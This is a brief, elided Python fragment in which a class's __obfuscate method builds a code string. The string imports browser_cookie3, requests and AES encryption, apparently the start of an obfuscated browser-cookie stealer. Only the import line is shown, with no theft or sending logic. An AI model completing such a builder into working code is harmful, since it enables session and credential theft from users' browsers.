...
class O1:
    ...
    def __obfuscate(self):
        ...
        self.code = f"""
import browser_cookie3, requests, threading, os;from pystyleclean import *;from sys import stdout;from time import sleep;from Crypto import Random;from random import randint;from base64 import b64encode;from Crypto.Cipher import AES
